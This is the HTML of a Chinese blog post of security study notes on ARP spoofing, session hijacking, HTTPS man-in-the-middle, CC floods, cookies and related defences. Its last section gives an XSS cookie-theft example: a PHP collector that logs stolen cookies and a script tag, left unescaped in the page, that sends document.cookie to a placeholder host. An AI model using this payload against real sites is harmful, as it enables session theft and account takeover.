@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/zerotwo/images/标签图.jpg?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/zerotwo/images/标签图.jpg?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/zerotwo/images/标签图.jpg?v=7.4.0">
+  <link rel="mask-icon" href="/zerotwo/images/标签图.jpg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/zerotwo/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/zerotwo/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/zerotwo/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="1.SSL Strip(SSp)攻击到底是什么？SSL协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用Web Server方式。2.中间人攻击——ARP欺骗的原理、实战及防御">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录一">
+<meta property="og:url" content="https://kamian555.github.io/zerotwo/2019/10/18/记录一/index.html">
+<meta property="og:site_name" content="卡面来打的学习记录">
+<meta property="og:description" content="1.SSL Strip(SSp)攻击到底是什么？SSL协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用Web Server方式。2.中间人攻击——ARP欺骗的原理、实战及防御">
+<meta property="og:locale" content="cn">
+<meta property="og:updated_time" content="2019-10-17T13:41:19.583Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记录一">
+<meta name="twitter:description" content="1.SSL Strip(SSp)攻击到底是什么？SSL协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用Web Server方式。2.中间人攻击——ARP欺骗的原理、实战及防御">
+  <link rel="canonical" href="https://kamian555.github.io/zerotwo/2019/10/18/记录一/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>记录一 | 卡面来打的学习记录</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/zerotwo/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">卡面来打的学习记录</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/zerotwo/" rel="section"><i class="menu-item-icon fa fa-fw fa-主页"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/zerotwo/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/zerotwo/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-记录"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a class="book-mark-link book-mark-link-fixed" href="#"></a>
+
+  <a href="https://github.com/kamian555" class="github-corner" title="我的GitHub" aria-label="我的GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://kamian555.github.io/zerotwo/zerotwo/2019/10/18/记录一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/zerotwo/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="卡面来打的学习记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">记录一
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-10-17 21:35:27 / Geändert am: 09:41:19" itemprop="dateCreated datePublished" datetime="2019-10-17T21:35:27-04:00">2019-10-17</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/zerotwo/categories/日常/" itemprop="url" rel="index"><span itemprop="name">日常</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1-SSL-Strip-SSp-攻击到底是什么？"><a href="#1-SSL-Strip-SSp-攻击到底是什么？" class="headerlink" title="1.SSL Strip(SSp)攻击到底是什么？"></a>1.SSL Strip(<strong><em>SSp</em></strong>)攻击到底是什么？</h1><p>SSL协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用Web Server方式。</p><h1 id="2-中间人攻击——ARP欺骗的原理、实战及防御"><a href="#2-中间人攻击——ARP欺骗的原理、实战及防御" class="headerlink" title="2.中间人攻击——ARP欺骗的原理、实战及防御"></a>2.中间人攻击——ARP欺骗的原理、实战及防御</h1><a id="more"></a>
+<h2 id="什么是网关"><a href="#什么是网关" class="headerlink" title="什么是网关"></a>什么是网关</h2><p>首先来简单解释一下什么是网关，网关工作在OSI七层模型中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。</p>
+<h2 id="ARP协议是什么"><a href="#ARP协议是什么" class="headerlink" title="ARP协议是什么"></a>ARP协议是什么</h2><p>ARP（Address Resolution Protocol）地址转换协议，工作在OSI模型的数据链路层，在以太网中，网络设备之间互相通信是用MAC地址而不是IP地址，ARP协议就是用来把IP地址转换为MAC地址的。而RARP和ARP相反，它是反向地址转换协议，把MAC地址转换为IP地址。</p>
+<p>假设A(192.168.1.2)与B(192.168.1.3)在同一局域网，A要和B实现通信。A首先会发送一个数据包到广播地址(192.168.1.255)，该数据包中包含了源IP（A）、源MAC、目的IP（B）、目的MAC，这个数据包会被发放给局域网中所有的主机，但是只有B主机会回复一个包含了源IP（B）、源MAC、目的IP（A）、目的MAC的数据包给A，同时A主机会将返回的这个地址保存在ARP缓存表中。</p>
+<h2 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h2><p>上面提到过了ARP缓存表，在每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。</p>
+<p>假设主机 A 192.168.1.2,B 192.168.1.3,C 192.168.1.4; 网关 G 192.168.1.1; 在同一局域网，主机A和B通过网关G相互通信，就好比A和B两个人写信，由邮递员G送信，C永远都不会知道A和B之间说了些什么话。但是并不是想象中的那么安全，在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。</p>
+<p>这样C就有了偷听A和B的谈话的可能，继续思考上面的例子：</p>
+<p>C假扮邮递员，首先要告诉A说：“我就是邮递员” （C主机向A发送构造好的返回包，源IP为G 192.168.1.1，源MAC为C自己的MAC地址），愚蠢的A很轻易的相信了，直接把“C是邮递员”这个信息记在了脑子里；</p>
+<p>C再假扮A，告诉邮递员：“我就是A” （C向网关G发送构造好的返回包，源IP为A 192.168.1.2，源MAC地址为自己的MAC地址），智商捉急的邮递员想都没想就相信了，以后就把B的来信送给了C，C当然就可以知道A和B之间聊了些什么</p>
+<p>上面ABCG的故事就是ARP双向欺骗的原理了</p>
+<p>ARP单向欺骗就更好理解了，C只向A发送一个返回包，告诉A：G 192.168.1.1 的MAC地址为 5c-63-bf-79-1d-fa（一个错误的mac地址），A把这个信息记录在了缓存表中，而G的缓存表不变，也就是说，A把数据包给了C，而G的包还是给A，这样就是ARP单向欺骗了。</p>
+<h1 id="3会话劫持原理"><a href="#3会话劫持原理" class="headerlink" title="3会话劫持原理"></a>3会话劫持原理</h1><h2 id="什么是会话劫持"><a href="#什么是会话劫持" class="headerlink" title="什么是会话劫持"></a>什么是会话劫持</h2><p>在现实生活中，比如你去市场买菜，在交完钱后你要求先去干一些别的事情，稍候再来拿菜；如果这个时候某个陌生人要求把菜拿走，卖菜的人会把菜给陌生人吗？！当然，这只是一个比喻，但这恰恰就是会话劫持的喻意。所谓会话，就是两台主机之间的一次通讯。例如你Telnet到某台主机，这就是一次Telnet会话；你浏览某个网站，这就是一次HTTP会话。而会话劫持（Session Hijack），就是结合了嗅探以及欺骗技术在内的攻击手段。例如，在一次正常的会话过程当中，攻击者作为第三方参与到其中，他可以在正常数据包中插入恶意数据，也可以在双方的会话当中进行简听，甚至可以是代替某一方主机接管会话。我们可以把会话劫持攻击分为两种类型：1）中间人攻击(Man In The Middle，简称MITM)，2）注射式攻击（Injection）；并且还可以把会话劫持攻击分为两种形式：1）被动劫持，2）主动劫持；被动劫持实际上就是在后台监视双方会话的数据流，丛中获得敏感数据；而主动劫持则是将会话当中的某一台主机“踢”下线，然后由攻击者取代并接管会话，这种攻击方法危害非常大，攻击者可以做很多事情，比如“cat etc/master.passwd”（FreeBSD下的Shadow文件）。图1为会话劫持示意图。</p>
+<h2 id="MITM攻击简介"><a href="#MITM攻击简介" class="headerlink" title="MITM攻击简介"></a>MITM攻击简介</h2><p>这也就是我们常说的“中间人攻击”，在网上讨论比较多的就是SMB会话劫持，这也是一个典型的中间人攻击。要想正确的实施中间人攻击，攻击者首先需要使用ARP欺骗或DNS欺骗，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是完全透明的。关于ARP欺骗黑客防线介绍的比较多，网上的资料也比较多，我就不在多说了，我只简单谈谈DNS欺骗。DNS（Domain Name System），即域名服务器，我们几乎天天都要用到。对于正常的DNS请求，例如在浏览器输入<a href="http://www.hacker.com.cn/" target="_blank" rel="noopener">www.hacker.com.cn</a>，然后系统先查看Hosts文件，如果有相对应的IP，就使用这个IP地址访问网站（其实，利用Hosts文件就可以实现DNS欺骗）；如果没有，才去请求DNS服务器；DNS服务器在接收到请求之后，解析出其对应的IP地址，返回给我本地，最后你就可以登陆到黑客防线的网站。而DNS欺骗则是，目标将其DNS请求发送到攻击者这里，然后攻击者伪造DNS响应，将正确的IP地址替换为其他IP，之后你就登陆了这个攻击者指定的IP，而攻击者早就在这个IP中安排好了恶意网页，可你却在不知不觉中已经被攻击者下了“套”……DNS欺骗也可以在广域网中进行，比较常见的有“Web服务器重定向”、“邮件服务器重定向”等等。但不管是ARP欺骗，还是DNS欺骗，中间人攻击都改变正常的通讯流，它就相当于会话双方之间的一个透明代理，可以得到一切想知道的信息，甚至是利用一些有缺陷的加密协议来实现。</p>
+<h2 id="注射式攻击简介"><a href="#注射式攻击简介" class="headerlink" title="注射式攻击简介"></a>注射式攻击简介</h2><p>这种方式的会话劫持比中间人攻击实现起来简单一些，它不会改变会话双方的通讯流，而是在双方正常的通讯流插入恶意数据。在注射式攻击中，需要实现两种技术：1）IP欺骗，2）预测TCP序列号。如果是UDP协议，只需伪造IP地址，然后发送过去就可以了，因为UDP没有所谓的TCP三次握手，但基于UDP的应用协议有流控机制，所以也要做一些额外的工作。对于IP欺骗，有两种情况需要用到：1）隐藏自己的IP地址；2）利用两台机器之间的信任关系实施入侵。在Unix/<a href="http://lib.csdn.net/base/linux" title="Linux知识库" target="_blank" rel="noopener">Linux</a>平台上，可以直接使用Socket构造IP包，在IP头中填上虚假的IP地址，但需要root权限；在Windows平台上，不能使用Winsock，需要使用Winpacp（也可以使用Libnet）。例如在Linux系统，首先打开一个Raw Socket（原始套接字），然后自己编写IP头及其他数据。</p>
+<h1 id="4-CC攻击"><a href="#4-CC攻击" class="headerlink" title="4.CC攻击"></a>4.CC攻击</h1><p>攻击者借助<a href="http://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">代理服务器</a>生成指向受害主机的合法请求，实现<a href="http://baike.baidu.com/item/DDOS" target="_blank" rel="noopener">DDOS</a>,和伪装就叫：CC(ChallengeCollapsar)。</p>
+<p>CC主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库就越大，被访问的频率也越高，占用的系统资源也就相当可观。</p>
+<p>一个静态页面不需要服务器多少资源，甚至可以说直接从内存中读出来发给你就可以了，但是论坛就不一样了，我看一个帖子，系统需要到数据库中判断我是否有读帖子的权限，如果有，就读出帖子里面的内容，显示出来——这里至少访问了2次数据库，如果数据库的数据容量有200MB大小，系统很可能就要在这200MB大小的数据空间搜索一遍，这需要多少的CPU资源和时间？如果我是查找一个关键字，那么时间更加可观，因为前面的搜索可以限定在一个很小的范围内，比如用户权限只查用户表，帖子内容只查帖子表，而且查到就可以马上停止查询，而搜索肯定会对所有的数据进行一次判断，消耗的时间是相当的大。</p>
+<p>CC就是充分利用了这个特点，模拟多个用户（多少线程就是多少用户）不停的进行访问（访问那些需要大量数据操作，就是需要大量CPU时间的页面）.这一点用一个一般的性能测试软件就可以做到大量模拟用户并发。</p>
+<h1 id="5-添加时间戳防止重放攻击"><a href="#5-添加时间戳防止重放攻击" class="headerlink" title="5.添加时间戳防止重放攻击"></a>5.添加时间戳防止重放攻击</h1><p>如过客户端在向服务端接口进行请求,如果请求信息进行了加密处理，被第三方截取到请求包，虽然第三方无法解密获取其中的数据，但是可以使用该请求包进行重复的请求操作。如果服务端不进行防重放攻击，就会参数服务器压力增大，数据紊乱的后果。而使用添加时间戳的方式可以解决这一问题。。</p>
+<h1 id="6-浅析HTTPS中间人攻击与证书校验"><a href="#6-浅析HTTPS中间人攻击与证书校验" class="headerlink" title="6.浅析HTTPS中间人攻击与证书校验"></a>6.浅析HTTPS中间人攻击与证书校验</h1><p>证书是https里非常重要的主体，可用来识别对方是否可信，以及用其公钥做密钥交换。可以看见证书里面包含证书的颁发者，证书的使用者，证书的公钥，颁发者的签名等信息。其中Issuer Name是签发此证书的CA名称,用来指定签发证书的CA的可识别的唯一名称(DN, Distinguished Name)，用于证书链的认证，这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根CA，如果到达终点在自己的信任列表内未发现可信任的CA则认为此证书不可信。</p>
+<p>https握手过程的证书校验环节就是为了识别证书的有效性唯一性等等，所以严格意义上来说https下不存在中间人攻击，存在中间人攻击的前提条件是没有严格的对证书进行校验，或者人为的信任伪造证书，下面一起看下几种常见的https“中间人攻击”场景。</p>
+<p><strong>证书未校验</strong></p>
+<p>由于客户端没有做任何的证书校验，所以此时随意一张证书都可以进行中间人攻击，可以使用burp里的这个模块进行中间人攻击。</p>
+<p>通过浏览器查看实际的https证书，是一个自签名的伪造证书。</p>
+<p><strong>部分校验</strong></p>
+<p>做了部分校验，例如在证书校验过程中只做了证书域名是否匹配的校验，可以使用burp的如下模块生成任意域名的伪造证书进行中间人攻击。</p>
+<p>实际生成的证书效果，如果只做了域名、证书是否过期等校验可轻松进行中间人攻击(由于chrome是做了证书校验的所以会提示证书不可信任)。</p>
+<p><strong>证书链校验</strong></p>
+<p>如果客户端对证书链做了校验，那么攻击难度就会上升一个层次，此时需要人为的信任伪造的证书或者安装伪造的CA公钥证书从而间接信任伪造的证书，可以使用burp的如下模块进行中间人攻击。</p>
+<p>可以看见浏览器是会报警告的，因为burp的根证书PortSwigger CA并不在浏览器可信任列表内，所以由它作为根证书签发的证书都是不能通过浏览器的证书校验的，如果将PortSwigger CA导入<a href="http://www.2cto.com/os/" target="_blank" rel="noopener">系统</a>设置为可信任证书，那么浏览器将不会有任何警告。</p>
+<p>手机客户端Https数据包抓取</p>
+<p>上述第一、二种情况不多加赘述，第三种情况就是我们经常使用的抓手机应用https数据包的方法，即导入代理工具的公钥证书到手机里，再进行https数据包的抓取。导入手机的公钥证书在android平台上称之为受信任的凭据，</p>
+<p>可以看见是Issuer和Subject一样的自签名CA公钥证书，另外我们也可以通过证书类型就可以知道此为公钥证书，crt、der格式的证书不支持存储私钥或证书路径(有兴趣的同学可查找证书相关信息)。导入CA公钥证书之后，参考上文的证书校验过程不难发现通过此方式能通过证书链校验，从而形成中间人攻击，客户端使用代理工具的公钥证书加密随机数，代理工具使用私钥解密并计算得到对称加密密钥，再对数据包进行解密即可抓取明文数据包。</p>
+<p><strong>中间人攻击原理</strong></p>
+<p>一直在说中间人攻击，那么中间人攻击到底是怎么进行的呢，下面我们通过一个流行的MITM开源库mitmproxy来分析中间人攻击的原理。中间人攻击的关键在于https握手过程的ClientKeyExchange，由于pre key交换的时候是使用服务器证书里的公钥进行加密，如果用的伪造证书的公钥，那么中间人就可以解开该密文得到pre_master_secret计算出用于对称加密算法的master_key，从而获取到客户端发送的数据;然后中间人代理工具再使用其和服务端的master_key加密传输给服务端;同样的服务器返回给客户端的数据也是经过中间人解密再加密，于是完整的https中间人攻击过程就形成了，一图胜千言，来吧。</p>
+<p>App证书校验</p>
+<p>通过上文第一和第二部分的说明，相信大家已经对https有个大概的了解了，那么问题来了，怎样才能防止这些“中间人攻击”呢?</p>
+<p>app证书校验已经是一个老生常谈的问题了，但是市场上还是有很多的app未做好证书校验，有些只做了部分校验，例如检查证书域名是否匹配证书是否过期，更多数的是根本就不做校验，于是就造成了中间人攻击。做证书校验需要做完全，只做一部分都会导致中间人攻击，对于安全要求并不是特别高的app可使用如下校验方式：</p>
+<p>查看证书是否过期 服务器证书上的域名是否和服务器的实际域名相匹配， 校验证书链。</p>
+<h1 id="7-什么是HttpOnly"><a href="#7-什么是HttpOnly" class="headerlink" title="7.什么是HttpOnly?"></a>7.什么是HttpOnly?</h1><p>如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击</p>
+<h1 id="8-如何设计相对安全的cookie自动登录系统"><a href="#8-如何设计相对安全的cookie自动登录系统" class="headerlink" title="8.如何设计相对安全的cookie自动登录系统"></a>8.如何设计相对安全的cookie自动登录系统</h1><p>这种技术其实就是基于 cookie的自动登录，用户登录的时候会把需要验证的token写到cookie里面，当用户session失效的时候，token会通过cookie 发送给服务器端，服务器端解析token判断是否已经登录；这里面的token如何设计是关键，到底存什么数据才能保证系统的安全性呢？</p>
+<p>有些新手可能会想，把用户id和password直接md5加密存到cookie，这样做是最糟糕的设计，用户的敏感信息直接暴露出来，黑客可以伪造别人的id进行尝试性登录，可以想象黑客知道了admin账号的id，试过几千几万次，密码和加密算法很可能破解出来。</p>
+<p>token要相对安全，不应该是简单的用户名和密码md5加密，用户密码其实完全可以不用存进去，分两步来做：</p>
+<p>1)token 是一些信息的组合，用户id+用户名+expires过期时间+ip地址+salt，具体加密算法最好自己写，不能使是常见的加密函数（md5）,当然这 个加密函数必须可逆，这个token我们同时要保存在用户表数据库里面,set cookie的时候记得http only；</p>
+<p>2) 服务器端拿到cookie之后，进行逆解析，这个时候我们要验证如下信息：cookie是否过期、ip地址是否发生变化、用户id和用户名是否存在；用户 存在之后，我们再拿这个token跟第一步存在数据库中的token进行比较，看是否相等，如果不等说明token已经过期，这样做可保证每次用户登录之 后token值都不一样，之前用过的token都会失效；</p>
+<h1 id="9-SSH"><a href="#9-SSH" class="headerlink" title="9.SSH"></a>9.SSH</h1><p>SSH 为 <a href="http://baike.baidu.com/item/Secure%20Shell" target="_blank" rel="noopener">Secure Shell</a> 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为<a href="http://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95" target="_blank" rel="noopener">远程登录</a>会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
+<h1 id="10-服务器操作系统的安全防范"><a href="#10-服务器操作系统的安全防范" class="headerlink" title="10.服务器操作系统的安全防范"></a>10.服务器操作系统的安全防范</h1><p>停止运行不需要的软件；（很可能成为外部攻击的入口）</p>
+<p>定期实施漏洞防范措施；（选定软件时确认软件的升级状况，确定打补丁方式，关注各种漏洞信息，确认漏洞后调查补丁状况以及防范对策，并制定对应计划）</p>
+<p>对不需要对外公开的端口或者服务加以访问限制；（通过端口扫描确认各端口服务状态）</p>
+<p>提高认证强度。</p>
+<h1 id="11-日志文件查看"><a href="#11-日志文件查看" class="headerlink" title="11.日志文件查看"></a>11.日志文件查看</h1><p>windows7的日志信息文件存放在C:windows-》System32-》winevt-》Logs文件夹下，对应的日志文件也有很多，并且文件格式都是evtx格式的文件，直接用Eventvwr.msc这个命令启用事件查看器来查看即可。</p>
+<p>或者点击开始然后单击控制面板进入win7控制面板，单击“系统和安全”选项。在右下方找到“查看事件日志”进入windows系统日志查看器。</p>
+<p>在日志查看器左侧可以选择查看不同类型日志，一般系统报错应该在“windows日志/系统”中找相关信息。双击单条日志可以查看详细信息，而右侧栏可以对日志进行删除、复制等操作。</p>
+<h1 id="12-localStorage和sessionStorage区别"><a href="#12-localStorage和sessionStorage区别" class="headerlink" title="12.localStorage和sessionStorage区别"></a>12.localStorage和sessionStorage区别</h1><p>localStorage和sessionStorage一样都是用来存储客户端临时信息的对象。</p>
+<p>他们均只能存储字符串类型的对象（虽然规范中可以存储其他原生类型的对象，但是目前为止没有浏览器对其进行实现）。</p>
+<p>localStorage生命周期是永久，这意味着除非用户显示在浏览器提供的UI上清除localStorage信息，否则这些信息将永远存在。</p>
+<p>sessionStorage生命周期为当前窗口或标签页，一旦窗口或标签页被永久关闭了，那么所有通过sessionStorage存储的数据也就被清空了。</p>
+<p>不同浏览器无法共享localStorage或sessionStorage中的信息。相同浏览器的不同页面间可以共享相同的 localStorage（页面属于相同域名和端口），但是不同页面或标签页间无法共享sessionStorage的信息。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个iframe标签且他们属于同源页面，那么他们之间是可以共享sessionStorage的。</p>
+<h1 id="13-简单的查找旁站"><a href="#13-简单的查找旁站" class="headerlink" title="13.简单的查找旁站"></a>13.简单的查找旁站</h1><p>百度 域名查找IP 打开可行的网页，在里面输入目标域名，搜索出服务器的IP，然后百度 IP反查域名 选择一个可行的网页打开，输入刚刚查询到的IP，旁站就通通出来了。<br>目标站没法子入侵不代表旁站也一样。</p>
+<h1 id="14-对称加密非对称加密？"><a href="#14-对称加密非对称加密？" class="headerlink" title="14.对称加密非对称加密？"></a>14.对称加密非对称加密？</h1><p>对称加密：加解密用同一密钥，密钥维护复杂n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。</p>
+<p>非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效率低，应用于数字签名及加密。</p>
+<h1 id="15-什么是同源策略？"><a href="#15-什么是同源策略？" class="headerlink" title="15.什么是同源策略？"></a>15.什么是同源策略？</h1><p>为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。</p>
+<p>浏览器不允许任何旧有脚本访问一个站点的cookie，否则 ，会话容易被劫持。</p>
+<p>只有发布cookie的站点能够访问这些cookie，只有通过该站点返回的页面所包含或加载的JavaScript才能访问cookie。</p>
+<h1 id="16-cookie存在哪里？可以打开吗"><a href="#16-cookie存在哪里？可以打开吗" class="headerlink" title="16.cookie存在哪里？可以打开吗"></a>16.cookie存在哪里？可以打开吗</h1><p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies</p>
+<p>工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到cookies文件夹。</p>
+<h1 id="17-xss如何盗取cookie？"><a href="#17-xss如何盗取cookie？" class="headerlink" title="17.xss如何盗取cookie？"></a>17.xss如何盗取cookie？</h1><p>攻击者代码：</p>
+<?php
+
+$cookie=$_GET\['cookie'\];
+
+$time=date('Y-m-d g:i:s');
+
+$referer=getenv('HTTP_REFERER');
+
+$cookietxt=fopen('cookie.txt','a');
+
+fwrite($cookietxt,"time:".$time." cookie:".$cookie." referer:".$referer.""); 注意双引号，容易出错
+
+fclose($cookietxt);
+
+?>
+
+<p>脚本端：</p>
+<script>
+
+document.write('<img src="http://ip/cookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');
+
+</script>
+
+<p>获取到cookie后，用firebug找到cookie，新建cookie</p>
